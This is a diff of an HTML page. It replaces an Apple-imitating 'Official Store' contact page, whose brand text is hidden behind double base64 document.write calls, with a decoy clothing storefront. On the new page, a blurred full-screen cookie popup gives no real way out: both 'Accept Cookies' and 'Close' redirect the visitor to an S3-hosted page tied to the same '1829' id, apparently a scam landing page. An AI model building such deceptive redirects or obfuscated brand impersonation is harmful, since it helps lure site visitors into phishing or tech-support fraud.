@@ -1,201 +1,704 @@
-
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <meta http-equiv="cache-control" content="max-age=3600" />
-        <meta content="" property="telephone" />
-        <title>Contact - Official Store-1829 </title>
-        <link rel="stylesheet" href="app.css" type="text/css" />
-		<script async src="https://scripts.simpleanalyticscdn.com/latest.js"></script>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aureva · ecommerce</title>
+  <!-- Font Awesome 6 (free) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background: #faf8f6;
+      color: #1e1e1e;
+      line-height: 1.5;
+    }
+
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* ---------- header / nav ---------- */
+    .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      padding: 20px 0;
+      border-bottom: 1px solid rgba(0,0,0,0.04);
+    }
+
+    .logo {
+      font-size: 2rem;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      color: #1e1e1e;
+    }
+    .logo span {
+      color: #b87c4b;
+      font-weight: 300;
+      margin-right: 4px;
+    }
+    .logo i {
+      color: #b87c4b;
+      font-size: 1.8rem;
+      margin-right: 6px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      font-weight: 500;
+      color: #2c2c2c;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: inherit;
+      transition: color 0.2s;
+    }
+    .nav-links a:hover {
+      color: #b87c4b;
+    }
+
+    .nav-icons {
+      display: flex;
+      gap: 1.2rem;
+      font-size: 1.25rem;
+    }
+    .nav-icons i {
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .nav-icons i:hover {
+      color: #b87c4b;
+    }
+
+    /* ---------- hero ---------- */
+    .hero {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      padding: 40px 0 30px;
+      gap: 30px;
+    }
+
+    .hero-content {
+      flex: 1 1 300px;
+    }
+    .hero-content .badge {
+      background: #ede7e0;
+      display: inline-block;
+      padding: 6px 18px;
+      border-radius: 40px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      color: #5e3e28;
+      margin-bottom: 16px;
+    }
+    .hero-content h1 {
+      font-size: 2.8rem;
+      font-weight: 600;
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      margin-bottom: 16px;
+    }
+    .hero-content h1 i {
+      color: #b87c4b;
+    }
+    .hero-content p {
+      font-size: 1.1rem;
+      color: #3d3d3d;
+      max-width: 440px;
+      margin-bottom: 28px;
+    }
+    .btn {
+      background: #1e1e1e;
+      color: white;
+      padding: 14px 38px;
+      border: none;
+      border-radius: 60px;
+      font-weight: 500;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.25s, transform 0.1s;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 8px 18px rgba(0,0,0,0.04);
+    }
+    .btn i {
+      font-size: 0.9rem;
+    }
+    .btn:hover {
+      background: #b87c4b;
+      color: white;
+    }
+
+    .hero-image {
+      flex: 1 1 340px;
+      background: #e8e0d8;
+      border-radius: 32px;
+      height: 300px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      box-shadow: 0 12px 28px rgba(0,0,0,0.04);
+    }
+    .hero-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    /* ---------- categories ---------- */
+    .section-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin: 48px 0 16px;
+      flex-wrap: wrap;
+    }
+    .section-head h2 {
+      font-size: 1.8rem;
+      font-weight: 500;
+      letter-spacing: -0.01em;
+    }
+    .section-head a {
+      color: #5e5e5e;
+      text-decoration: none;
+      font-weight: 500;
+      border-bottom: 2px solid transparent;
+      transition: border-color 0.2s;
+    }
+    .section-head a:hover {
+      border-color: #b87c4b;
+      color: #1e1e1e;
+    }
+
+    .category-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 24px;
+      margin: 8px 0 20px;
+    }
+    .category-card {
+      background: white;
+      border-radius: 28px;
+      padding: 22px 10px;
+      text-align: center;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.02);
+      transition: all 0.2s;
+      border: 1px solid rgba(0,0,0,0.02);
+      cursor: default;
+    }
+    .category-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 18px 30px rgba(0,0,0,0.04);
+      border-color: #e2d6cc;
+    }
+    .category-card img {
+      width: 70px;
+      height: 70px;
+      object-fit: contain;
+      margin-bottom: 10px;
+      filter: drop-shadow(0 4px 6px rgba(0,0,0,0.02));
+    }
+    .category-card p {
+      font-weight: 500;
+      color: #1e1e1e;
+    }
+
+    /* ---------- products grid ---------- */
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 28px;
+      margin: 12px 0 40px;
+    }
+    .product-card {
+      background: white;
+      border-radius: 28px;
+      padding: 18px 16px 20px;
+      transition: all 0.2s;
+      border: 1px solid rgba(0,0,0,0.02);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.01);
+      display: flex;
+      flex-direction: column;
+    }
+    .product-card:hover {
+      transform: scale(1.01);
+      box-shadow: 0 18px 32px rgba(0,0,0,0.04);
+      border-color: #ded3c9;
+    }
+    .product-img {
+      background: #f3efeb;
+      border-radius: 24px;
+      height: 180px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      margin-bottom: 14px;
+    }
+    .product-img img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .product-card h4 {
+      font-weight: 500;
+      font-size: 1.05rem;
+      margin-bottom: 4px;
+    }
+    .product-card .price {
+      font-weight: 600;
+      color: #b87c4b;
+      font-size: 1.1rem;
+      margin: 6px 0 8px;
+    }
+    .product-card .rating {
+      color: #f5b342;
+      letter-spacing: 2px;
+      font-size: 0.9rem;
+    }
+    .product-card .add-btn {
+      margin-top: 10px;
+      background: #f0ebe6;
+      border: none;
+      padding: 12px 0;
+      border-radius: 40px;
+      font-weight: 500;
+      color: #1e1e1e;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .product-card .add-btn i {
+      font-size: 0.85rem;
+    }
+    .product-card .add-btn:hover {
+      background: #b87c4b;
+      color: white;
+    }
+
+    /* ---------- footer ---------- */
+    .footer {
+      border-top: 1px solid rgba(0,0,0,0.04);
+      margin-top: 40px;
+      padding: 32px 0 20px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      color: #3d3d3d;
+    }
+    .footer .copy {
+      font-size: 0.9rem;
+    }
+    .footer .social i {
+      font-size: 1.3rem;
+      margin-left: 16px;
+      color: #3d3d3d;
+      transition: color 0.2s;
+      cursor: pointer;
+    }
+    .footer .social i:hover {
+      color: #b87c4b;
+    }
+
+    /* ---------- responsive touches ---------- */
+    @media (max-width: 700px) {
+      .navbar {
+        flex-direction: column;
+        gap: 12px;
+        align-items: stretch;
+      }
+      .nav-links {
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 1rem;
+      }
+      .nav-icons {
+        justify-content: center;
+      }
+      .hero-content h1 {
+        font-size: 2.2rem;
+      }
+      .hero-image {
+        height: 220px;
+      }
+    }
+    @media (max-width: 480px) {
+      .product-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+      }
+      .category-grid {
+        grid-template-columns: repeat(3, 1fr);
+        gap: 12px;
+      }
+    }
+  </style>
 
 <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-PH1QTWEN1J"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NTV0NLN2X5"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
 
-  gtag('config', 'G-PH1QTWEN1J');
+gtag('config', 'G-NTV0NLN2X5');
 </script>
 
-    </head>
-    <body>
-        <div id="result"></div>
-        <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
-        <nav id="ac-globalnav" class="no-js">
-            <div class="ac-gn-content">
-                <ul class="ac-gn-header">
-                    <li class="ac-gn-item ac-gn-menuicon">
-                        <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
-                            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
-                                <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
-                            </span>
-                            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
-                                <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
-                            </span>
-                        </label>
-                        <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
-                            <span class="ac-gn-menuanchor-label">Open Menu </span>
-                        </a>
-                        <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
-                            <span class="ac-gn-menuanchor-label">Close Menu </span>
-                        </a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-main">
-                        <a class="ac-gn-link ac-gn-link-main" href="#" id="ac-gn-firstfocus-small"><span class="ac-gn-link-text"><script>document.write(atob(atob("UVhCd2JHVT0=")));</script> </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
-                        <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a><span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                    </li>
-                </ul>
-                <ul class="ac-gn-list">
-                    <li class="ac-gn-item ac-gn-main">
-                        <a class="ac-gn-link ac-gn-link-main" href="#" id="ac-gn-firstfocus"><span class="ac-gn-link-text"><script>document.write(atob(atob("UVhCd2JHVT0=")));</script> </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
-                        <a class="ac-gn-link ac-gn-link-mac" href="#"><span class="ac-gn-link-text">Mac </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
-                        <a class="ac-gn-link ac-gn-link-ipad" href="#"><span class="ac-gn-link-text">iPad </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
-                        <a class="ac-gn-link ac-gn-link-iphone" href="#"><span class="ac-gn-link-text">iPhone </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
-                        <a class="ac-gn-link ac-gn-link-watch" href="#"><span class="ac-gn-link-text">Watch </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
-                        <a class="ac-gn-link ac-gn-link-tv" href="#"><span class="ac-gn-link-text">TV </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
-                        <a class="ac-gn-link ac-gn-link-music" href="#"><span class="ac-gn-link-text">Music </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
-                        <a class="ac-gn-link ac-gn-link-support" href="#"><span class="ac-gn-link-text">Support </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                        <a class="ac-gn-link ac-gn-link-search" href="#"><span class="ac-gn-search-placeholder" aria-hidden="true"><script>document.write(atob(atob("VTJWaGNtTm9JR0Z3Y0d4bExtTnZiUT09")));</script> </span></a>
-                    </li>
-                    <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
-                        <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
-                            <span class="ac-gn-link-text"><script>document.write(atob(atob("VTJodmNIQnBibWNnUW1Gbg==")));</script> </span>
-                            <span class="ac-gn-bag-badge" aria-hidden="true"></span>
-                        </a>
-                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                    </li>
-                </ul>
-                <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
-                    <div class="ac-gn-searchview-content">
-                        <form id="ac-gn-searchform" class="ac-gn-searchform" action="#" method="get">
-                            <div class="ac-gn-searchform-wrapper">
-                                <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
-                                <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
-                                <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
-                                <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
-                            </div>
-                        </form>
-                        <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
-                    </div>
-                    <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
-                        <span class="ac-gn-searchview-close-wrapper">
-                            <span class="ac-gn-searchview-close-left"></span>
-                            <span class="ac-gn-searchview-close-right"></span>
-                        </span>
-                    </button>
-                </aside>
-                <aside class="ac-gn-bagview">
-                    <div class="ac-gn-bagview-scrim">
-                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
-                    </div>
-                    <div class="ac-gn-bagview-content" id="ac-gn-bagview-content"></div>
-                </aside>
-            </div>
-        </nav>
-        <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
-        <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+</head>
+<body>
 
-        <div class="main">
-            <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
-                <div class="ac-ln-wrapper">
-                    <div class="ac-ln-background"></div>
-                    <div class="ac-ln-content">
-                        <span class="ac-ln-title">
-                            <a href="#"><script>document.write(atob(atob("UVhCd2JHVWdVM1Z3Y0c5eWRBPT0=")));</script> <span class="telephone"></span> <font color="red"><font class="js_setPhoneBlock"></font></font></a>
-                        </span>
-                        <div class="ac-ln-menu">
-                            <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
-                            <div class="ac-ln-menu-tray">
-                                <ul class="ac-ln-menu-items">
-                                    <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a></li>
-                                </ul>
-                            </div>
-                            <div class="ac-ln-actions">
-                                <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
-                                    <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span></label>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </nav>
-            <section class="as-columns  as-columns--1up  as-banner as-banner--top">
-                <div class="row">
-                    <div class="column large-12 medium-12 small-12">
-                        <div class='as-banner-cont'>
-                            <div class='as-banner-image as-banner-image--top'>
-                                <style type="text/css">
-                                    .as-banner-image.as-banner-image--top {
-                                        background-image: url("/assets/nav/contact-us-large.jpg");
-                                    }
-                                    .as-banner-image.as-banner-image--top:before {
-                                        content: "";
-                                        display: block;
-                                    }
-                                    @media only screen and (max-width: 735px) {
-                                        .as-banner-image.as-banner-image--top {
-                                            background-image: url("/assets/nav/contact-us-small.jpg");
-                                        }
-                                    }
-                                </style>
-                                <img sizes="(min-width:735px ) 735w, 100vw" srcset="/assets/nav/contact-us-small.jpg 735w, /assets/nav/contact-us-large.jpg 1440w" alt="" class="as-image-speculativedownload" src="/assets/nav/contact-us-large.jpg"/>
-                            </div>
-                        </div>
-                        <div class="as-banner-content">
-                            <div class="pageTitle  ">
-                                <h1 class="pageTitle-heading"><script>document.write(atob(atob("UVhCd2JHVWdVM1Z3Y0c5eWRBPT0=")));</script> </h1>
-                                <p class="pageTitle-intro js_setTextBlock" />
-                            </div>
-                            <div class="sectionTitle sectionTitleBlock">
-                                <h2 class="sectionTitle-heading"></h2>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
-        <footer id="ac-globalfooter" class="no-js">
-            <div class="ac-gf-content">
-                <section class="ac-gf-footer">
-                    <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink"><script>document.write(atob(atob("UVhCd2JHVWdVM1J2Y21VPQ==")));</script> </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.</div>
-                    <div class="ac-gf-footer-locale">
-                        <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="/assets/nav/us.png" alt="" width="16" height="16" />United States </a>
-                    </div>
-                    <div class="ac-gf-footer-legal">
-                        <div class="ac-gf-footer-legal-copyright"><script>document.write(atob(atob("UTI5d2VYSnBaMmgwd3FrZ01qQXlOaUJCY0hCc1pTNGdRV3hzSUhKcFoyaDBjeUJ5WlhObGNuWmxaQzQ9")));</script> </div>
-                        <div class="ac-gf-footer-legal-links">
-                            <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy Policy </a>
-                            <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
-                            <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a>
-                            <a class="ac-gf-footer-legal-link" href="#">Site Map </a> <a class="ac-gf-footer-legal-link" href="#"><script>document.write(atob(atob("UTI5dWRHRmpkQ0JCY0hCc1pRPT0=")));</script> </a>
-                        </div>
-                    </div>
-                </section>
-            </div>
-        </footer>
-        <script src="assets/jquery.js"></script>
-        <script src="app.js"></script>
-    </body>
+<div class="container">
+
+<style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+    }
+
+    .page-content {
+      padding: 60px 20px;
+      text-align: center;
+    }
+
+    .page-content h1 {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    .page-content p {
+      font-size: 18px;
+      color: #555;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+
+    /* Overlay with blur */
+    .cookie-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.35);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+
+    /* Popup box */
+    .cookie-popup {
+      background: #fff;
+      width: 100%;
+      max-width: 600px;
+      border-radius: 16px;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.25);
+      padding: 28px;
+      text-align: left;
+      animation: popupFade 0.35s ease;
+    }
+
+    .cookie-popup h3 {
+      margin: 0 0 12px;
+      font-size: 24px;
+      color: #111;
+    }
+
+    .cookie-popup p {
+      margin: 0 0 20px;
+      font-size: 15px;
+      line-height: 1.7;
+      color: #555;
+    }
+
+    .cookie-buttons {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .cookie-btn {
+      border: none;
+      padding: 12px 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      transition: 0.3s ease;
+      flex: 1;
+      min-width: 140px;
+    }
+
+    .accept-btn {
+      background: #007bff;
+      color: #fff;
+    }
+
+    .accept-btn:hover {
+      background: #0056d2;
+    }
+
+    .close-btn {
+      background: #e9ecef;
+      color: #333;
+    }
+
+    .close-btn:hover {
+      background: #d9dde1;
+    }
+
+    @keyframes popupFade {
+      from {
+        opacity: 0;
+        transform: scale(0.95) translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .cookie-popup {
+        padding: 22px;
+      }
+
+      .cookie-popup h3 {
+        font-size: 20px;
+      }
+
+      .cookie-buttons {
+        flex-direction: column;
+      }
+
+      .cookie-btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-content">
+    <h1>My Website</h1>
+    <p>
+      This is your website content. When the popup appears, the background will blur.
+    </p>
+  </div>
+
+  <!-- Blur Overlay + Popup -->
+  <div class="cookie-overlay" id="cookieOverlay">
+    <div class="cookie-popup">
+      <h3>We Value Your Privacy</h3>
+      <p>
+        We use cookies to improve your browsing experience, serve personalized content,
+        and analyze our traffic. By clicking “Accept Cookies”, you agree to our use of cookies.
+      </p>
+
+      <div class="cookie-buttons">
+        <button class="cookie-btn accept-btn" onclick="acceptCookies()">Accept Cookies</button>
+        <button class="cookie-btn close-btn" onclick="acceptCookies()">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function acceptCookies() {
+      window.location.href = "https://s3.amazonaws.com/f285ed7e0f229b029e53.1829.97a26b001c528ac/index.html";
+    }
+
+    function closePopup() {
+      document.getElementById("cookieOverlay").style.display = "none";
+    }
+  </script>
+
+  <!-- header -->
+  <header class="navbar">
+    <div class="logo">
+      <i class="fas fa-leaf"></i><span>Aureva</span>
+    </div>
+    <div class="nav-links">
+     <a href="index.html">Home</a>
+      <a href="privacy.html">Privacy</a>
+      <a href="terms.html">Terms</a>
+      <a href="about.html">About Us</a>
+    </div>
+    <div class="nav-icons">
+      <i class="fas fa-search"></i>
+      <i class="fas fa-heart"></i>
+      <i class="fas fa-shopping-bag"></i>
+    </div>
+  </header>
+
+  <!-- hero section -->
+  <section class="hero">
+    <div class="hero-content">
+      <div class="badge"><i class="fas fa-sparkles" style="margin-right: 6px;"></i> spring collection 2026</div>
+      <h1>timeless <i>·</i> modern <i>·</i> <br>made for you</h1>
+      <p>Discover the new Aureva edit – crafted with intention, designed to last.</p>
+      <button class="btn">shop now <i class="fas fa-arrow-right"></i></button>
+    </div>
+    <div class="hero-image">
+      <!-- working image: unsplash + decorative alt -->
+      <img src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=600&h=400&fit=crop&auto=format" alt="Aureva hero – modern lifestyle" loading="lazy">
+    </div>
+  </section>
+
+  <!-- categories -->
+  <div class="section-head">
+    <h2>shop by category</h2>
+    <a href="#">see all <i class="fas fa-chevron-right" style="font-size: 0.7rem;"></i></a>
+  </div>
+  <div class="category-grid">
+    <div class="category-card">
+      <img src="https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=150&h=150&fit=crop&auto=format" alt="women" loading="lazy">
+      <p>Women</p>
+    </div>
+    <div class="category-card">
+      <img src="https://images.unsplash.com/photo-1617127365659-c47b3c2a7ae5?w=150&h=150&fit=crop&auto=format" alt="men" loading="lazy">
+      <p>Men</p>
+    </div>
+    <div class="category-card">
+      <img src="https://images.unsplash.com/photo-1586023492125-27b2c045efd7?w=150&h=150&fit=crop&auto=format" alt="home" loading="lazy">
+      <p>Home</p>
+    </div>
+    <div class="category-card">
+      <img src="https://images.unsplash.com/photo-1547949003-9792a18a2601?w=150&h=150&fit=crop&auto=format" alt="beauty" loading="lazy">
+      <p>Beauty</p>
+    </div>
+    <div class="category-card">
+      <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=150&h=150&fit=crop&auto=format" alt="accessories" loading="lazy">
+      <p>Accessories</p>
+    </div>
+  </div>
+
+  <!-- featured products -->
+  <div class="section-head">
+    <h2>best sellers</h2>
+    <a href="#">view all</a>
+  </div>
+  <div class="product-grid">
+
+    <!-- product 1 -->
+    <div class="product-card">
+      <div class="product-img">
+        <img src="https://images.unsplash.com/photo-1564584217132-2271feaeb3c5?w=400&h=400&fit=crop&auto=format" alt="Aureva cashmere sweater" loading="lazy">
+      </div>
+      <h4>cashmere sweater</h4>
+      <div class="price">$189</div>
+      <div class="rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i> 4.8</div>
+      <button class="add-btn"><i class="fas fa-plus"></i> add to bag</button>
+    </div>
+
+    <!-- product 2 -->
+    <div class="product-card">
+      <div class="product-img">
+        <img src="https://images.unsplash.com/photo-1594938298603-c8148c4dae35?w=400&h=400&fit=crop&auto=format" alt="leather tote bag" loading="lazy">
+      </div>
+      <h4>leather tote</h4>
+      <div class="price">$245</div>
+      <div class="rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> 5.0</div>
+      <button class="add-btn"><i class="fas fa-plus"></i> add to bag</button>
+    </div>
+
+    <!-- product 3 -->
+    <div class="product-card">
+      <div class="product-img">
+        <img src="https://images.unsplash.com/photo-1558618666-fcd25c85f33d?w=400&h=400&fit=crop&auto=format" alt="wool blazer" loading="lazy">
+      </div>
+      <h4>wool blazer</h4>
+      <div class="price">$310</div>
+      <div class="rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> 4.9</div>
+      <button class="add-btn"><i class="fas fa-plus"></i> add to bag</button>
+    </div>
+
+    <!-- product 4 -->
+    <div class="product-card">
+      <div class="product-img">
+        <img src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=400&h=400&fit=crop&auto=format" alt="silk scarf" loading="lazy">
+      </div>
+      <h4>silk scarf</h4>
+      <div class="price">$95</div>
+      <div class="rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> 4.7</div>
+      <button class="add-btn"><i class="fas fa-plus"></i> add to bag</button>
+    </div>
+
+    <!-- product 5 -->
+    <div class="product-card">
+      <div class="product-img">
+        <img src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=400&h=400&fit=crop&auto=format" alt="sneakers" loading="lazy">
+      </div>
+      <h4>leather sneakers</h4>
+      <div class="price">$165</div>
+      <div class="rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> 4.9</div>
+      <button class="add-btn"><i class="fas fa-plus"></i> add to bag</button>
+    </div>
+
+    <!-- product 6 -->
+    <div class="product-card">
+      <div class="product-img">
+        <img src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=400&h=400&fit=crop&auto=format" alt="minimalist watch" loading="lazy">
+      </div>
+      <h4>minimalist watch</h4>
+      <div class="price">$210</div>
+      <div class="rating"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i> 4.6</div>
+      <button class="add-btn"><i class="fas fa-plus"></i> add to bag</button>
+    </div>
+  </div>
+
+  <!-- footer -->
+  <footer class="footer">
+    <div class="copy">
+      <i class="far fa-copyright"></i> 2026 Aureva — all rights reserved
+    </div>
+    <div class="social">
+      <i class="fab fa-instagram"></i>
+      <i class="fab fa-pinterest"></i>
+      <i class="fab fa-twitter"></i>
+      <i class="fab fa-youtube"></i>
+    </div>
+  </footer>
+
+</div> <!-- container -->
+
+  <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5033569,4,511,95,18,00000000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5033569&101" alt="web log free" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+</body>
 </html>
